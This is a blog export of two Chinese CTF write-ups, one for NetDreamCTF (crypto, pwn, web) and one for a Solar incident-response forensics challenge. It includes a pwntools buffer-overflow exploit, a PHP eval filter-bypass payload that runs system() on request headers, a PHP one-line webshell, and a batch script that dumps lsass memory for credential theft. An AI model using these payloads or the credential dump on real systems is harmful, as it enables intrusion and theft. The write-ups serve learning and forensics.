<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>第一届NetDreamCTF赛后复现</title>
      <link href="/posts/38132.html"/>
      <url>/posts/38132.html</url>
      
        <content type="html"><![CDATA[<h2 id="第一届NetDreamCTF赛后复现（部分题目）"><a href="#第一届NetDreamCTF赛后复现（部分题目）" class="headerlink" title="第一届NetDreamCTF赛后复现（部分题目）"></a>第一届NetDreamCTF赛后复现（部分题目）</h2><p>全部的题解：<a href="https://mp.weixin.qq.com/s/zl151-YJSiyj0TvjKmNggw">https://mp.weixin.qq.com/s/zl151-YJSiyj0TvjKmNggw</a></p><p>存档：<a href="https://github.com/Team-intN18-SoybeanSeclab/NetDreamCTF2025_Source">https://github.com/Team-intN18-SoybeanSeclab/NetDreamCTF2025_Source</a></p><p>纸豪学长的讲解：<a href="https://www.bilibili.com/video/BV14aYBzDEGA/?spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=3cad66818fbd72b6100b5f159983493b">netdream2025题目讲解 ezpwn&amp;ezupload&amp;ezbypass_哔哩哔哩_bilibili</a></p><p><img src="/../images/image-20250817140400019.png" alt="image-20250817140400019"></p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">题目：你知道Base和TXT吗?Y3RmLmN0Zi52aW4=</span><br></pre></td></tr></table></figure><p>base64解码之后 txt域名解析记录</p><p><img src="/../images/image-20250817140706604.png" alt="image-20250817140706604"></p><p><img src="/../images/image-20250817140803070.png" alt="image-20250817140803070"></p><h4 id="I-AM-K"><a href="#I-AM-K" class="headerlink" title="I AM K!"></a>I AM K!</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">题目：</span><br><span class="line">B3F0re赵的立方体-1398441600</span><br><span class="line"></span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">def encrypt(plaintext, key):</span><br><span class="line">    key_sum = sum(ord(char) for char in key)</span><br><span class="line">    if not plaintext.startswith(&quot;flag&#123;&quot;):</span><br><span class="line">        plaintext = &quot;flag&#123;&quot; + plaintext</span><br><span class="line">    if not plaintext.endswith(&quot;&#125;&quot;):</span><br><span class="line">        plaintext += &quot;&#125;&quot;</span><br><span class="line">    </span><br><span class="line">    encrypted = []</span><br><span class="line">    for char in plaintext:</span><br><span class="line">        encrypted_char = (ord(char) + key_sum) % 256 </span><br><span class="line">        encrypted.append(encrypted_char)</span><br><span class="line"></span><br><span class="line">    encrypted_bytes = bytes(encrypted)</span><br><span class="line">    base64_encoded = base64.b64encode(encrypted_bytes).decode(&#x27;utf-8&#x27;)</span><br><span class="line">    shift = key_sum % 26</span><br><span class="line">    caesar_shifted = &quot;&quot;</span><br><span class="line">    for char in base64_encoded:</span><br><span class="line">        if char.isalpha():</span><br><span class="line">            shifted_char = chr(((ord(char) - ord(&#x27;A&#x27;) + shift) % 26 + ord(&#x27;A&#x27;))) if char.isupper() else chr(((ord(char) - ord(&#x27;a&#x27;)) + shift) % 26 + ord(&#x27;a&#x27;))</span><br><span class="line">            caesar_shifted += shifted_char</span><br><span class="line">        else:</span><br><span class="line">            caesar_shifted += char</span><br><span class="line">    hex_encoded = caesar_shifted.encode(&#x27;utf-8&#x27;).hex()</span><br><span class="line">    </span><br><span class="line">    return hex_encoded</span><br><span class="line"></span><br><span class="line">key = &quot;xx_xx_xx_xx_xx_xx_xx_xx_xx_xx_xx_xx_xx_xx&quot;</span><br><span class="line"></span><br><span class="line">plaintext = &quot;Thi5 1s th3 Fl@g&quot; </span><br><span class="line"></span><br><span class="line">ciphertext = encrypt(plaintext, key)</span><br><span class="line">print(ciphertext)</span><br><span class="line"></span><br><span class="line">#686545356839417466377a5266364133695a54556a376857696f6c4e67377a5166364248</span><br></pre></td></tr></table></figure><p>1.(ASCII值 + key_sum) % 256</p><p>2.字节列表转换为字节串，再进行 Base64 编码</p><p>3.凯撒移位</p><p>4.十六进制编码</p><p>这里是自己爆破密钥了 预期确实精妙【musc】</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_with_keysum</span>(<span class="params">ciphertext_hex, key_sum</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Hex decode</span></span><br><span class="line">        ciphertext_bytes = <span class="built_in">bytes</span>.fromhex(ciphertext_hex)</span><br><span class="line">        caesar_shifted = ciphertext_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Reverse Caesar shift</span></span><br><span class="line">        shift = key_sum % <span class="number">26</span></span><br><span class="line">        base64_encoded = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> caesar_shifted:</span><br><span class="line">            <span class="keyword">if</span> char.isalpha():</span><br><span class="line">                <span class="keyword">if</span> char.isupper():</span><br><span class="line">                    shifted_char = <span class="built_in">chr</span>(((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) - shift) % <span class="number">26</span>) + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    shifted_char = <span class="built_in">chr</span>(((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) - shift) % <span class="number">26</span>) + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">                base64_encoded += shifted_char</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                base64_encoded += char</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Base64 decode</span></span><br><span class="line">        encrypted_bytes = base64.b64decode(base64_encoded)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Reverse additive cipher</span></span><br><span class="line">        plaintext = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> byte <span class="keyword">in</span> encrypted_bytes:</span><br><span class="line">            decrypted_char = (byte - key_sum) % <span class="number">256</span></span><br><span class="line">            plaintext += <span class="built_in">chr</span>(decrypted_char)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Check for &#x27;flag&#123;...&#125;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> plaintext.startswith(<span class="string">&quot;flag&#123;&quot;</span>) <span class="keyword">and</span> plaintext.endswith(<span class="string">&quot;&#125;&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> plaintext</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">ciphertext_hex = <span class="string">&quot;686545356839417466377a5266364133695a54556a376857696f6c4e67377a5166364248&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Brute-force key_sum from 0 to 10000</span></span><br><span class="line"><span class="keyword">for</span> key_sum <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10001</span>):</span><br><span class="line">    plaintext = decrypt_with_keysum(ciphertext_hex, key_sum)</span><br><span class="line">    <span class="keyword">if</span> plaintext:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Found key_sum = <span class="subst">&#123;key_sum&#125;</span>, plaintext = <span class="subst">&#123;plaintext&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h4 id="ezimg"><a href="#ezimg" class="headerlink" title="ezimg"></a>ezimg</h4><p>这里做的时候被做局了 没看到py文件藏的 还是太单纯了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">题目：给了张奶龙图片</span><br></pre></td></tr></table></figure><p>![milkdragon (1)](..&#x2F;images&#x2F;milkdragon (1).jpg)</p><p>使用winhex打开图片，在最后有两段的base64密文</p><p><img src="/../images/image-20250817142438533.png" alt="image-20250817142438533"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.bilibili.com/video/BV1GJ411x7h7/</span><br><span class="line">https://docs.qq.com/doc/DZWxobHhmRW9pd09k</span><br></pre></td></tr></table></figure><p>第一个是纯骚扰</p><p>打开第二个，全部复制出来有</p><p><img src="/../images/image-20250817142615568.png" alt="image-20250817142615568"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">并非flag</span><br><span class="line">flag&#123;114514-1919810-B1ngF3i_1s_a_@mazing_0ld3r&#125;</span><br><span class="line">aHR0cHM6Ly93d2duLmxhbnpvdWwuY29tL2kzcTR5MzBodWVmYQ==</span><br></pre></td></tr></table></figure><p> 再解密有一个下载链接里面有个压缩包里面是个py文件</p><p> <img src="/../images/image-20250817142948773.png" alt="image-20250817142948773"></p><p> 没看到下面还有东西 没做出来</p><p><img src="/../images/image-20250817143016863.png" alt="image-20250817143016863"></p><p> 将上面获得的flag放进去解密就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">key = base64.urlsafe_b64encode(<span class="string">b&#x27;flag&#123;114514-1919810-B1ngF3i_1s_a_@mazing_0ld3r&#125;&#x27;</span>[:<span class="number">32</span>].ljust(<span class="number">32</span>, <span class="string">b&#x27;\0&#x27;</span>)[:<span class="number">32</span>])</span><br><span class="line">cipher = Fernet(key)</span><br><span class="line">c=</span><br><span class="line"><span class="string">&quot;gAAAAABoa6KH5msX3aA5PUiSZq1Ubma9DvtpU9ywyijLEbfQYNl-hn5Q_4NlmpcAD2pNjq07KvMYd2R32Id_R_3iW5GZn3yKTBW5R_5jFI_307_S9oep0zE0dhZCf_XOymC2WQhB2_6s&quot;</span></span><br><span class="line">decrypted = cipher.decrypt(c.encode())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decrypted plaintext:&quot;</span>, decrypted.decode())</span><br></pre></td></tr></table></figure><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><h4 id="ezpwn"><a href="#ezpwn" class="headerlink" title="ezpwn"></a>ezpwn</h4><p>- </p><p>这里贴一下[纸豪]<a href="https://www.bilibili.com/video/BV14aYBzDEGA/?spm_id_from=333.1387.homepage.video_card.click&vd_source=3cad66818fbd72b6100b5f159983493b">netdream2025题目讲解 ezpwn&amp;ezupload&amp;ezbypass_哔哩哔哩_bilibili</a>学长~ 的链接 声音很帅</p><p> <img src="/../images/image-20250817153655298.png" alt="image-20250817153655298"></p><p> 题目进来跟进到vuln</p><p><img src="/../images/image-20250817153729143.png" alt="image-20250817153729143"></p><p> <img src="/../images/image-20250817154009298.png" alt="image-20250817154009298"></p><p> 明显的栈溢出 找后门地址和偏移量</p><p><img src="/../images/image-20250817154040309.png" alt="image-20250817154040309"></p><p> <img src="/../images/image-20250817154054280.png" alt="image-20250817154054280"></p><p>使用cyclic工具测算</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cyclic 100</span><br><span class="line">gdb ./pwn</span><br><span class="line">输入生成的字符串 看到停在了0x61616174</span><br><span class="line">cyclic -l 0x61616174 得到偏移量76</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250817155853433.png" alt="image-20250817155853433"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./attachment&#x27;)</span><br><span class="line">#p = remote(&quot;127.0.0.1&quot;, 9999)</span><br><span class="line">payload = b&#x27;a&#x27; * 76 + p32(0x080491B6)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250817164600305.png" alt="image-20250817164600305"></p><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><p>web都是docker拉下来的 flag是自己填上去的 都一样的 </p><h4 id="ezpython"><a href="#ezpython" class="headerlink" title="ezpython"></a>ezpython</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hint：fuzz部分需要爆破http://x.x.x.x/的路径，六位数</span><br></pre></td></tr></table></figure><p>进来是一个空白页面 查看源代码 访问下一级目录</p><p><img src="/../images/image-20250824141424090.png" alt="image-20250824141424090"></p><p>进来提示爆破数字组的目录 使用burp爆破一手 六位数 </p><p><img src="/../images/image-20250824141505057.png" alt="image-20250824141505057"></p><p><img src="/../images/image-20250824142613374.png" alt="image-20250824142613374"></p><p><img src="/../images/image-20250824142657740.png" alt="image-20250824142657740"></p><p>跟burp一样爆破参数名 当访问name?&#x3D;1的时候 发现页面更改了 flask+python 打一套ssti</p><p><img src="/../images/image-20250824142949912.png" alt="image-20250824142949912"></p><p><img src="/../images/image-20250824144022280.png" alt="image-20250824144022280"></p><h4 id="ezbypass"><a href="#ezbypass" class="headerlink" title="ezbypass"></a>ezbypass</h4><p>这是一题绕过滤rce题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\|implode|phpinfo|localeconv|pos|current|print|var|dump|getallheaders|get|defined|str|split|spl|autoload|extensions|eval|phpversion|floor|sqrt|tan|cosh|sinh|ceil|chr|dir|getcwd|getallheaders|end|next|prev|reset|each|pos|current|array|reverse|pop|rand|flip|flip|rand|content|session_id|session_start|echo|readfile|highlight|show|source|file|assert/i&quot;</span>, <span class="variable">$test</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$test</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;oh nonono hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure><p>过滤了很多运行的命令字符 但是没有过滤system 可以用system来执行命令 发现被禁了getallheaders 但是有别名apache_request_headers()的字符可以使用 end可以使用join使用</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getallheaders()</span><br><span class="line">getallheaders()返回当前请求的所有请求头信息，局限于Apache（apache_request_headers()和getallheaders()功能相似，可互相替代，不过也是局限于Apache）</span><br><span class="line">当确定能够返回时，我们就能在数据包最后一行加上一个请求头，写入恶意代码，再用end()函数指向最后一个请求头，使其执行，payload：</span><br><span class="line">var_dump(end(getallheaders()));</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250824153315095.png" alt="image-20250824153315095"></p><p><img src="/../images/image-20250824153733382.png" alt="image-20250824153733382"></p><p>system(join(apache_request_headers()))；</p><p><img src="/../images/image-20250824154125855.png" alt="image-20250824154125855"></p><h4 id=""><a href="#" class="headerlink" title=""></a></h4>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025年Solar应急响应公益月赛7月--复盘</title>
      <link href="/posts/3233.html"/>
      <url>/posts/3233.html</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/1.png"></p><p>这一次比六月题量多了，取证和应急1没连贯上，用了很多时间后面没做，还得继续沉淀</p><p>学习一下n0o0b神的wp，复盘一手：<a href="https://www.n0o0b.com/archives/solar-7">2025年Solar应急响应公益月赛-7月|n0o0b’s blog</a>。官方解可以去solar公众号食取</p><p>做取证的的时候，还是用 volatility2在乱找,相对来说lovelymem真是好用，Tokeii0神:<a href="https://github.com/Tokeii0/LovelyMem">https://github.com/Tokeii0/LovelyMem</a></p><p>总结：要很多新的知识点，很nice，自己做的时候和复盘排查思路不一样，还是得多总结多学习</p><h2 id="题目信息—–VOL-EASY"><a href="#题目信息—–VOL-EASY" class="headerlink" title="题目信息—–VOL_EASY"></a>题目信息—–VOL_EASY</h2><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">某企业服务器近日遭受隐秘入侵。安全团队通过日志溯源发现，黑客利用Web应用漏洞植入恶意后门，根据溯源的信息配合警方逮捕了黑客，安全团队已经紧急保存了黑客电脑的内存转储文件，请你开始取证以便固定证据。请根据题目文件，找出下面10条证据让罪犯服软吧！</span><br></pre></td></tr></table></figure><h3 id="【任务1】VOL-EASY"><a href="#【任务1】VOL-EASY" class="headerlink" title="【任务1】VOL_EASY"></a>【任务1】VOL_EASY</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">题目信息：</span><br><span class="line">黑客上传的一句话木马密码是多少？</span><br></pre></td></tr></table></figure><p>lovelymem导入镜像，timeline_ntfs发现ezshell.php，右键打开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">知识点：NTFS日志会记录NTFS文件系统中文件的创建、修改、增加数据、删除等操作执行的时间</span><br></pre></td></tr></table></figure><p><img src="/../images/2.png" alt="2"></p><p><img src="/../images/image-20250729203044299.png" alt="image-20250729203044299"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;solar&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>flag{solar}</p><h3 id="【任务2】VOL-EASY"><a href="#【任务2】VOL-EASY" class="headerlink" title="【任务2】VOL_EASY"></a>【任务2】VOL_EASY</h3><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">黑客使用的木马连接工具叫什么（比如xx.exe）？(仅首字母大写)</span><br></pre></td></tr></table></figure><p>看下findevil，发现蚁剑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">findevil通常指的是通过技术手段检测、定位内存中存在的恶意代码、恶意进程或其他威胁因素的行为或工具功能</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729203833881.png" alt="image-20250729203833881"></p><p>flag{Antsword.exe}</p><h3 id="【任务3】VOL-EASY"><a href="#【任务3】VOL-EASY" class="headerlink" title="【任务3】VOL_EASY"></a>【任务3】VOL_EASY</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">黑客使用的木马连接工具的位置在哪里（比如C:\xxxx\xx.exe） ？</span><br></pre></td></tr></table></figure><p>flie直接搜Antsword.exe</p><p><img src="/../images/image-20250729204249198.png" alt="image-20250729204249198"></p><p>flag{C:\Tools\AntSword-Loader-v4.0.3-win32-x64\AntSword.exe}</p><h3 id="【任务4】VOL-EASY"><a href="#【任务4】VOL-EASY" class="headerlink" title="【任务4】VOL_EASY"></a>【任务4】VOL_EASY</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">黑客获取到的FLAG是什么？</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729204619083.png" alt="image-20250729204619083"></p><p>flag{ok!get_webshell_is_good_idea~}</p><h3 id="【任务5】VOL-EASY"><a href="#【任务5】VOL-EASY" class="headerlink" title="【任务5】VOL_EASY"></a>【任务5】VOL_EASY</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">黑客入侵的网站地址是多少（只需要http://xxxxx/）？</span><br></pre></td></tr></table></figure><p>我这里是想着蚁剑要连，可能是文件上传到目标网站上，所以在浏览器记录上找到的</p><p><img src="/../images/image-20250729210250666.png" alt="image-20250729210250666"></p><p>n0o0b神这里是先扫描了一手网络，然后试了192.228.79.201，不行就直接正则了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">正则表达式 `\d+\.\d+\.\d+\.\d+` ，这个正则表达式用于匹配IPv4 地址</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729205747167.png" alt="image-20250729205747167"></p><p><img src="/../images/image-20250729210758496.png" alt="image-20250729210758496"></p><p>flag{<a href="http://192.168.186.140/%7D">http://192.168.186.140/}</a></p><h3 id="【任务6】VOL-EASY"><a href="#【任务6】VOL-EASY" class="headerlink" title="【任务6】VOL_EASY"></a>【任务6】VOL_EASY</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">黑客入侵时，使用的系统用户名是什么？</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729211338146.png" alt="image-20250729211338146"></p><p>flag{Administrator}</p><h3 id="【任务7】VOL-EASY"><a href="#【任务7】VOL-EASY" class="headerlink" title="【任务7】VOL_EASY"></a>【任务7】VOL_EASY</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">黑客创建隐藏账户的密码是多少？</span><br></pre></td></tr></table></figure><p>打的时候，从这题开始就没有连贯起来，想着是被攻击机器的信息，不懂了gg</p><p>n0o0b神直接就正则搜net user，然后猜个5</p><p><img src="/../images/image-20250729211844240.png" alt="image-20250729211844240"></p><p>flag{solar2025}</p><h3 id="【任务8-9-10】VOL-EASY"><a href="#【任务8-9-10】VOL-EASY" class="headerlink" title="【任务8,9,10】VOL_EASY"></a>【任务8,9,10】VOL_EASY</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">黑客首次操作靶机的关键程序是什么？</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729212439796.png" alt="image-20250729212439796"></p><p>一开始找ezshell.php，有两个bat文件</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">echo</span> [*] 正在获取 lsass.exe PID...</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> /f &quot;tokens=<span class="number">2</span> delims=,&quot; <span class="variable">%%a</span> <span class="keyword">in</span> (&#x27;tasklist /FI &quot;IMAGENAME eq lsass.exe&quot; /FO CSV /NH&#x27;) <span class="keyword">do</span> (</span><br><span class="line">    <span class="built_in">set</span> PID=<span class="variable">%%~</span>a</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> &quot;<span class="variable">%PID%</span>&quot;==&quot;&quot; (</span><br><span class="line">    <span class="built_in">echo</span> [!] 未找到 lsass.exe 进程，或没有权限。</span><br><span class="line">    <span class="built_in">pause</span></span><br><span class="line">    <span class="keyword">exit</span> /b <span class="number">1</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> [*] PID: <span class="variable">%PID%</span></span><br><span class="line"><span class="built_in">echo</span> [*] 正在尝试导出内存转储...</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> OUTPUT=%~dp0lsass.dmp</span><br><span class="line"></span><br><span class="line">rundll32.exe comsvcs.dll, MiniDump <span class="variable">%PID%</span> <span class="variable">%OUTPUT%</span> full</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">exist</span> &quot;<span class="variable">%OUTPUT%</span>&quot; (</span><br><span class="line">    <span class="built_in">echo</span> [✓] 成功导出 lsass 内存为: <span class="variable">%OUTPUT%</span></span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line">    <span class="built_in">echo</span> [!] 导出失败，可能权限不足。</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">主要功能是导出系统中lsass.exe进程的内存转储文件（lsass.dmp）,lsass.exe是 Windows 系统的本地安全认证子系统进程，负责处理用户登录认证、密码哈希存储等敏感安全信息</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729213256953.png" alt="image-20250729213256953"></p><p>根据程序搜镜像的PID就好了，可以找到pid，文件路劲，直接一波后面三题了</p><h2 id="题目信息—–应急大师"><a href="#题目信息—–应急大师" class="headerlink" title="题目信息—–应急大师"></a>题目信息—–应急大师</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这是一台被黑客入侵的服务器，安全团队有进行一些基础溯源。目前服务器已经断网处理，请你继续协助安全团队进行溯源分析，将整个证据链补充完整。</span><br></pre></td></tr></table></figure><p>这也是取证的时候，被入侵的服务器</p><h3 id="【任务1】应急大师"><a href="#【任务1】应急大师" class="headerlink" title="【任务1】应急大师"></a>【任务1】应急大师</h3><p>做的时候，多是直接敲的cmd命令,这么看来还是直接搜事件的id更快一点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请提交隐藏用户的名称？</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729214351239.png" alt="image-20250729214351239"></p><p>好像刚进来就给答案了</p><h3 id="【任务2】应急大师"><a href="#【任务2】应急大师" class="headerlink" title="【任务2】应急大师"></a>【任务2】应急大师</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 